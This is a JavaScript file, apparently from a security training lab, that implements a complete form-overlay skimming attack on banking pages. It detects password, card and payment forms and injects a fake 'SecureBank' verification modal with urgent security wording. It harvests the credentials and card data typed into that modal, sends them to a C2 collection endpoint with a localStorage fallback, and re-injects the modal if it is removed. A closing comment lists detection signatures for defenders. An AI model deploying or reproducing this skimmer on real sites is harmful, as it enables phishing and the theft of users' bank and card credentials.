/**
 * FORM-OVERLAY.JS - DYNAMIC FORM INJECTION ATTACK
 *
 * This attack demonstrates DOM-based skimming through:
 * - Dynamic fake form overlay injection
 * - Real form hiding and redirection
 * - Credential harvesting through fake UI elements
 * - Sophisticated visual mimicry
 *
 * Based on real-world overlay attacks observed in:
 * - Banking trojans (form grabbing)
 * - Man-in-the-browser attacks
 * - Overlay malware patterns
 * - Social engineering tactics
 *
 * FOR EDUCATIONAL PURPOSES ONLY
 */

;(function () {
  'use strict'

  console.log('[Form-Overlay] Initializing form overlay injection attack...')

  // Attack configuration
  // Dynamically determine C2 URL based on environment
  const hostname = window.location.hostname
  let exfilUrl = 'http://localhost:9004/collect' // Local development default
  let healthUrl = 'http://localhost:9004/health' // Local development default

  // Production and staging - use relative URL since C2 is proxied by nginx
  if (hostname.includes('run.app') || hostname.includes('pcioasis.com')) {
    exfilUrl = window.location.origin + '/collect'
    healthUrl = window.location.origin + '/health'
  }

  /**
   * Health Check - Ping C2 server on page load to ensure it's ready
   * This prevents data loss during server startup
   */
  async function checkC2Health() {
    try {
      const response = await fetch(healthUrl, {
        method: 'GET',
        mode: 'cors',
        credentials: 'omit',
        cache: 'no-cache'
      })
      
      if (response.ok) {
        const data = await response.json()
        console.log('[Form-Overlay] ✅ C2 server is ready:', data)
        return true
      } else {
        console.warn('[Form-Overlay] ⚠️ C2 server health check failed with status:', response.status)
        return false
      }
    } catch (error) {
      console.warn('[Form-Overlay] ⚠️ C2 server health check failed:', error.message)
      // Retry after a short delay
      setTimeout(() => {
        checkC2Health().then(ready => {
          if (ready) {
            console.log('[Form-Overlay] ✅ C2 server is now ready after retry')
          }
        })
      }, 2000)
      return false
    }
  }

  // Perform health check immediately on page load
  checkC2Health()

  const CONFIG = {
    exfilUrl: exfilUrl,
    healthUrl: healthUrl,
    debug: true,
    targetForms: [
      '#transfer-form',
      '#payment-form',
      '#card-action-form',
      '#settings-form',
      'form[class*="banking"]',
      'form[class*="payment"]'
    ],
    overlayDelay: 2000, // Wait 2s before showing overlay
    mimicryTimeout: 10000, // Remove overlay after 10s if no interaction
    persistence: true, // Re-inject if overlay is removed
    socialEngineering: {
      urgency: true, // Use urgent messaging
      security: true, // Emphasize security
      authority: true // Use bank branding
    }
  }

  function log(message, data) {
    if (CONFIG.debug) {
      console.log('[Form-Overlay]', message, data || '')
    }
  }

  // Attack state
  let overlayActive = false
  let targetForm = null
  let overlayElement = null
  let capturedCredentials = new Map()
  let injectionAttempts = 0

  /**
   * Form Detection and Analysis
   */
  function findTargetForms() {
    log('Scanning for target forms...')

    const forms = []
    CONFIG.targetForms.forEach(selector => {
      const elements = document.querySelectorAll(selector)
      elements.forEach(form => {
        if (form && form.offsetParent !== null) {
          // Visible form
          forms.push({
            element: form,
            selector: selector,
            formType: analyzeFormType(form),
            sensitiveFields: analyzeSensitiveFields(form),
            priority: calculateFormPriority(form)
          })
        }
      })
    })

    // Sort by priority (highest first)
    forms.sort((a, b) => b.priority - a.priority)

    log(`Found ${forms.length} target forms`)
    return forms
  }

  function analyzeFormType(form) {
    const formText = (form.innerHTML + form.className + form.id).toLowerCase()

    if (formText.includes('password') || formText.includes('security')) {
      return 'authentication'
    } else if (formText.includes('transfer') || formText.includes('payment')) {
      return 'financial'
    } else if (formText.includes('card') || formText.includes('cvv')) {
      return 'payment'
    } else if (formText.includes('settings') || formText.includes('profile')) {
      return 'account'
    }

    return 'unknown'
  }

  function analyzeSensitiveFields(form) {
    const sensitiveSelectors = [
      'input[type="password"]',
      'input[name*="password"]',
      'input[id*="password"]',
      'input[name*="card"]',
      'input[id*="card"]',
      'input[name*="cvv"]',
      'input[id*="cvv"]',
      'input[name*="account"]',
      'input[id*="account"]',
      'input[autocomplete*="cc-"]'
    ]

    const sensitiveFields = []
    sensitiveSelectors.forEach(selector => {
      const fields = form.querySelectorAll(selector)
      fields.forEach(field => {
        sensitiveFields.push({
          element: field,
          type: field.type,
          name: field.name || field.id,
          autocomplete: field.autocomplete,
          placeholder: field.placeholder
        })
      })
    })

    return sensitiveFields
  }

  function calculateFormPriority(form) {
    let priority = 0

    // High priority for forms with passwords
    if (form.querySelector('input[type="password"]')) priority += 100

    // High priority for card-related forms
    if (form.innerHTML.toLowerCase().includes('card')) priority += 80

    // Medium priority for financial forms
    if (form.innerHTML.toLowerCase().includes('transfer')) priority += 60
    if (form.innerHTML.toLowerCase().includes('payment')) priority += 60

    // Bonus for multiple sensitive fields
    const sensitiveFieldCount = analyzeSensitiveFields(form).length
    priority += sensitiveFieldCount * 20

    // Bonus for visible and active forms
    if (form.offsetParent !== null) priority += 10
    if (form.style.display !== 'none') priority += 10

    return priority
  }

  /**
   * Overlay Creation and Injection
   */
  function createOverlayHTML(formType, sensitiveFields) {
    log(`Creating overlay for form type: ${formType}`)

    let overlayHTML = ''
    let title = ''
    let subtitle = ''
    let fields = ''

    // Generate appropriate social engineering content
    switch (formType) {
      case 'authentication':
        title = '🔐 Security Verification Required'
        subtitle = 'Please re-enter your credentials to continue this secure transaction.'
        break
      case 'financial':
        title = '⚠️ Transaction Verification'
        subtitle = 'Additional security verification is required for this high-value transaction.'
        break
      case 'payment':
        title = '💳 Payment Security Check'
        subtitle = 'Please verify your payment information to ensure secure processing.'
        break
      default:
        title = '🏦 SecureBank Verification'
        subtitle = 'Please verify your account credentials to proceed.'
    }

    // Generate form fields based on detected sensitive fields
    sensitiveFields.forEach(field => {
      let fieldHTML = ''
      const fieldId = 'overlay_' + (field.name || 'field_' + Date.now())
      const fieldType = field.type === 'password' ? 'password' : 'text'
      let placeholder = field.placeholder || ''
      let label = ''

      // Generate appropriate labels and placeholders
      if (field.name.includes('password')) {
        label = 'Account Password'
        placeholder = placeholder || 'Enter your account password'
      } else if (field.name.includes('card')) {
        label = 'Card Number'
        placeholder = placeholder || 'Enter card number'
      } else if (field.name.includes('cvv')) {
        label = 'CVV'
        placeholder = placeholder || 'CVV'
      } else if (field.name.includes('account')) {
        label = 'Account Number'
        placeholder = placeholder || 'Enter account number'
      } else {
        label = field.name.charAt(0).toUpperCase() + field.name.slice(1)
        placeholder = placeholder || `Enter ${field.name}`
      }

      fieldHTML = `
                <div class="overlay-form-group">
                    <label for="${fieldId}" class="overlay-label">${label}</label>
                    <input type="${fieldType}" id="${fieldId}" name="${field.name}"
                           placeholder="${placeholder}" class="overlay-input" required>
                </div>
            `

      fields += fieldHTML
    })

    // Add additional high-value fields if not present
    if (!sensitiveFields.some(f => f.name.includes('password'))) {
      fields += `
                <div class="overlay-form-group">
                    <label for="overlay_password" class="overlay-label">Account Password</label>
                    <input type="password" id="overlay_password" name="password"
                           placeholder="Enter your account password" class="overlay-input" required>
                </div>
            `
    }

    overlayHTML = `
            <div class="form-overlay-backdrop" id="form-overlay-backdrop">
                <div class="form-overlay-container">
                    <div class="form-overlay-header">
                        <div class="overlay-logo">🏦 SecureBank</div>
                        <button class="overlay-close" id="overlay-close">&times;</button>
                    </div>
                    <div class="form-overlay-content">
                        <h3 class="overlay-title">${title}</h3>
                        <p class="overlay-subtitle">${subtitle}</p>
                        <div class="overlay-security-notice">
                            <span class="security-icon">🔒</span>
                            <span>This is a secure transaction. Your information is encrypted.</span>
                        </div>
                        <form id="overlay-form" class="overlay-form">
                            ${fields}
                            <div class="overlay-actions">
                                <button type="submit" class="overlay-submit">Verify & Continue</button>
                                <button type="button" class="overlay-cancel" id="overlay-cancel">Cancel</button>
                            </div>
                        </form>
                    </div>
                    <div class="overlay-footer">
                        <span>🔐 SSL Secured | SecureBank © 2024</span>
                    </div>
                </div>
            </div>
        `

    return overlayHTML
  }

  function createOverlayStyles() {
    const styles = `
            <style id="overlay-styles">
                .form-overlay-backdrop {
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: rgba(0, 0, 0, 0.8);
                    z-index: 99999;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    animation: overlayFadeIn 0.3s ease-out;
                }

                .form-overlay-container {
                    background: white;
                    border-radius: 8px;
                    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
                    max-width: 500px;
                    width: 90%;
                    max-height: 90vh;
                    overflow-y: auto;
                    animation: overlaySlideIn 0.4s ease-out;
                }

                .form-overlay-header {
                    background: linear-gradient(135deg, #2c5aa0, #1e3a8a);
                    color: white;
                    padding: 1rem 1.5rem;
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                }

                .overlay-logo {
                    font-size: 1.2rem;
                    font-weight: bold;
                }

                .overlay-close {
                    background: none;
                    border: none;
                    color: white;
                    font-size: 1.5rem;
                    cursor: pointer;
                    opacity: 0.8;
                    transition: opacity 0.2s;
                }

                .overlay-close:hover {
                    opacity: 1;
                }

                .form-overlay-content {
                    padding: 2rem 1.5rem;
                }

                .overlay-title {
                    margin: 0 0 0.5rem 0;
                    color: #1f2937;
                    font-size: 1.25rem;
                    font-weight: 600;
                }

                .overlay-subtitle {
                    margin: 0 0 1.5rem 0;
                    color: #6b7280;
                    line-height: 1.5;
                }

                .overlay-security-notice {
                    background: #f0f9ff;
                    border: 1px solid #0ea5e9;
                    border-radius: 4px;
                    padding: 0.75rem;
                    margin-bottom: 1.5rem;
                    display: flex;
                    align-items: center;
                    gap: 0.5rem;
                    font-size: 0.875rem;
                    color: #0369a1;
                }

                .security-icon {
                    font-size: 1rem;
                }

                .overlay-form-group {
                    margin-bottom: 1rem;
                }

                .overlay-label {
                    display: block;
                    margin-bottom: 0.5rem;
                    font-weight: 600;
                    color: #1f2937;
                }

                .overlay-input {
                    width: 100%;
                    padding: 0.75rem;
                    border: 1px solid #d1d5db;
                    border-radius: 4px;
                    font-size: 1rem;
                    transition: border-color 0.2s;
                    box-sizing: border-box;
                }

                .overlay-input:focus {
                    outline: none;
                    border-color: #2c5aa0;
                    box-shadow: 0 0 0 3px rgba(44, 90, 160, 0.1);
                }

                .overlay-actions {
                    display: flex;
                    gap: 1rem;
                    margin-top: 1.5rem;
                }

                .overlay-submit {
                    background: #2c5aa0;
                    color: white;
                    border: none;
                    padding: 0.75rem 1.5rem;
                    border-radius: 4px;
                    font-size: 1rem;
                    font-weight: 600;
                    cursor: pointer;
                    flex: 1;
                    transition: background 0.2s;
                }

                .overlay-submit:hover {
                    background: #1e3a8a;
                }

                .overlay-cancel {
                    background: white;
                    color: #6b7280;
                    border: 1px solid #d1d5db;
                    padding: 0.75rem 1.5rem;
                    border-radius: 4px;
                    font-size: 1rem;
                    cursor: pointer;
                    transition: all 0.2s;
                }

                .overlay-cancel:hover {
                    background: #f9fafb;
                    border-color: #9ca3af;
                }

                .overlay-footer {
                    background: #f9fafb;
                    padding: 1rem 1.5rem;
                    text-align: center;
                    font-size: 0.875rem;
                    color: #6b7280;
                    border-top: 1px solid #e5e7eb;
                }

                @keyframes overlayFadeIn {
                    from { opacity: 0; }
                    to { opacity: 1; }
                }

                @keyframes overlaySlideIn {
                    from {
                        opacity: 0;
                        transform: translateY(-50px) scale(0.9);
                    }
                    to {
                        opacity: 1;
                        transform: translateY(0) scale(1);
                    }
                }

                /* Hide original form when overlay is active */
                .form-overlay-hidden {
                    opacity: 0.3;
                    pointer-events: none;
                    transition: opacity 0.3s;
                }
            </style>
        `

    return styles
  }

  function injectOverlay(targetFormData) {
    log('Injecting form overlay...')

    if (overlayActive) {
      log('Overlay already active')
      return
    }

    injectionAttempts++
    targetForm = targetFormData

    // Create overlay HTML
    const overlayHTML = createOverlayHTML(targetFormData.formType, targetFormData.sensitiveFields)
    const overlayStyles = createOverlayStyles()

    // Inject styles
    document.head.insertAdjacentHTML('beforeend', overlayStyles)

    // Inject overlay
    document.body.insertAdjacentHTML('beforeend', overlayHTML)

    overlayElement = document.getElementById('form-overlay-backdrop')
    overlayActive = true

    // Hide/disable original form
    if (targetFormData.element) {
      targetFormData.element.classList.add('form-overlay-hidden')
    }

    // Setup overlay event handlers
    setupOverlayHandlers()

    // Start monitoring for overlay removal (persistence)
    if (CONFIG.persistence) {
      startPersistenceMonitoring()
    }

    log('Form overlay injected successfully')
  }

  function setupOverlayHandlers() {
    const overlayForm = document.getElementById('overlay-form')
    const closeBtn = document.getElementById('overlay-close')
    const cancelBtn = document.getElementById('overlay-cancel')

    if (overlayForm) {
      overlayForm.addEventListener('submit', e => {
        e.preventDefault()
        handleOverlaySubmission(e.target)
      })
    }

    if (closeBtn) {
      closeBtn.addEventListener('click', () => {
        closeOverlay()
      })
    }

    if (cancelBtn) {
      cancelBtn.addEventListener('click', () => {
        closeOverlay()
      })
    }

    // Auto-close after timeout if no interaction
    setTimeout(() => {
      if (overlayActive && overlayElement) {
        log('Auto-closing overlay due to timeout')
        closeOverlay()
      }
    }, CONFIG.mimicryTimeout)
  }

  function handleOverlaySubmission(form) {
    log('Processing overlay form submission...')

    const formData = new FormData(form)
    const credentials = {}

    for (let [key, value] of formData.entries()) {
      credentials[key] = value
    }

    // Store captured credentials
    const captureId = 'capture_' + Date.now()
    capturedCredentials.set(captureId, {
      timestamp: Date.now(),
      targetForm: targetForm.selector,
      formType: targetForm.formType,
      credentials: credentials,
      userAgent: navigator.userAgent,
      url: window.location.href
    })

    log('Credentials captured:', Object.keys(credentials))

    // Show fake processing
    showFakeProcessing(form)

    // Exfiltrate captured data
    setTimeout(() => {
      exfiltrateCredentials(captureId)
    }, 1000)
  }

  function showFakeProcessing(form) {
    const submitBtn = form.querySelector('.overlay-submit')
    if (submitBtn) {
      submitBtn.textContent = 'Verifying...'
      submitBtn.disabled = true

      setTimeout(() => {
        submitBtn.textContent = 'Verified ✓'
        setTimeout(() => {
          closeOverlay()
          showFakeSuccess()
        }, 1000)
      }, 2000)
    }
  }

  function showFakeSuccess() {
    // Create temporary success message
    const successMsg = document.createElement('div')
    successMsg.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: #10b981;
            color: white;
            padding: 1rem 1.5rem;
            border-radius: 4px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
            z-index: 999999;
            animation: slideIn 0.3s ease-out;
        `
    successMsg.innerHTML = '✓ Security verification successful'
    document.body.appendChild(successMsg)

    setTimeout(() => {
      successMsg.remove()
    }, 3000)
  }

  function closeOverlay() {
    log('Closing form overlay...')

    if (overlayElement) {
      overlayElement.remove()
      overlayElement = null
    }

    // Remove styles
    const styleElement = document.getElementById('overlay-styles')
    if (styleElement) {
      styleElement.remove()
    }

    // Restore original form
    if (targetForm && targetForm.element) {
      targetForm.element.classList.remove('form-overlay-hidden')
    }

    overlayActive = false
    targetForm = null

    log('Form overlay closed')
  }

  /**
   * Persistence and Anti-Removal
   */
  function startPersistenceMonitoring() {
    const observer = new MutationObserver(mutations => {
      mutations.forEach(mutation => {
        if (mutation.type === 'childList') {
          mutation.removedNodes.forEach(node => {
            if (node === overlayElement) {
              log('Overlay removal detected, re-injecting...')
              setTimeout(() => {
                if (!overlayActive && injectionAttempts < 3) {
                  const forms = findTargetForms()
                  if (forms.length > 0) {
                    injectOverlay(forms[0])
                  }
                }
              }, 2000)
            }
          })
        }
      })
    })

    observer.observe(document.body, {
      childList: true,
      subtree: true
    })
  }

  /**
   * Data Exfiltration
   */
  async function exfiltrateCredentials(captureId) {
    const captureData = capturedCredentials.get(captureId)
    if (!captureData) {
      log('No capture data found for ID:', captureId)
      return
    }

    log('Exfiltrating captured credentials...')

    const payload = {
      type: 'form_overlay_capture',
      captureId: captureId,
      data: captureData,
      metadata: {
        injectionAttempts: injectionAttempts,
        attackType: 'form-overlay-injection',
        timestamp: Date.now()
      }
    }

    try {
      const response = await fetch(CONFIG.exfilUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload),
        mode: 'cors',
        credentials: 'omit'
      })

      if (response.ok) {
        log('Credentials exfiltrated successfully')
        capturedCredentials.delete(captureId)
      } else {
        log('Credential exfiltration failed with status:', response.status)
      }
    } catch (error) {
      log('Credential exfiltration error:', error.message)

      // Fallback: store in localStorage for later retrieval
      try {
        const stored = JSON.parse(localStorage.getItem('_tmp_data') || '[]')
        stored.push(payload)
        localStorage.setItem('_tmp_data', JSON.stringify(stored))
        log('Credentials stored locally for later exfiltration')
      } catch (storageError) {
        log('Local storage fallback failed:', storageError.message)
      }
    }
  }

  /**
   * Attack Initialization
   */
  function initFormOverlayAttack() {
    log('Initializing form overlay attack...')

    // Wait for page to stabilize
    setTimeout(() => {
      const targetForms = findTargetForms()

      if (targetForms.length > 0) {
        log(`Found ${targetForms.length} target forms, preparing overlay injection...`)

        // Inject overlay after delay
        setTimeout(() => {
          injectOverlay(targetForms[0])
        }, CONFIG.overlayDelay)
      } else {
        log('No suitable target forms found, monitoring for dynamic forms...')

        // Monitor for dynamically added forms
        const observer = new MutationObserver(() => {
          const newForms = findTargetForms()
          if (newForms.length > 0 && !overlayActive) {
            log('New target form detected, injecting overlay...')
            injectOverlay(newForms[0])
            observer.disconnect()
          }
        })

        observer.observe(document.body, {
          childList: true,
          subtree: true
        })
      }
    }, 1000)
  }

  // Start the attack when DOM is ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initFormOverlayAttack)
  } else {
    initFormOverlayAttack()
  }

  // Expose control functions for testing
  window.formOverlayAttack = {
    inject: initFormOverlayAttack,
    close: closeOverlay,
    getStatus: () => ({
      active: overlayActive,
      attempts: injectionAttempts,
      captures: capturedCredentials.size
    }),
    getCapturedData: () => Array.from(capturedCredentials.values())
  }
})()

/**
 * FORM OVERLAY ATTACK ANALYSIS:
 *
 * This attack demonstrates sophisticated form overlay injection techniques:
 *
 * 1. **Dynamic Form Analysis**:
 *    - Intelligent form detection and prioritization
 *    - Sensitive field analysis and mapping
 *    - Form type classification (authentication, financial, payment)
 *
 * 2. **Visual Mimicry**:
 *    - Pixel-perfect overlay design matching bank styling
 *    - Professional CSS animations and transitions
 *    - Authentic security messaging and branding
 *
 * 3. **Social Engineering**:
 *    - Urgent security verification messaging
 *    - Authority-based design (bank logos, SSL indicators)
 *    - Contextual form field generation
 *
 * 4. **Stealth and Persistence**:
 *    - DOM mutation monitoring for anti-removal
 *    - Automatic re-injection if overlay is removed
 *    - Original form hiding and disabling
 *
 * 5. **Credential Harvesting**:
 *    - Complete form data capture
 *    - Real-time validation simulation
 *    - Multiple exfiltration fallback mechanisms
 *
 * Detection Signatures:
 * - High z-index overlay elements (99999+)
 * - Dynamic style injection with overlay patterns
 * - Form element hiding via CSS manipulation
 * - Backdrop elements with high opacity
 * - Fake security messaging and SSL indicators
 * - DOM mutation observers for persistence
 * - Fetch requests with credentials data
 * - LocalStorage abuse for data persistence
 *
 * This attack provides training data for detecting sophisticated
 * overlay-based credential harvesting techniques.
 */
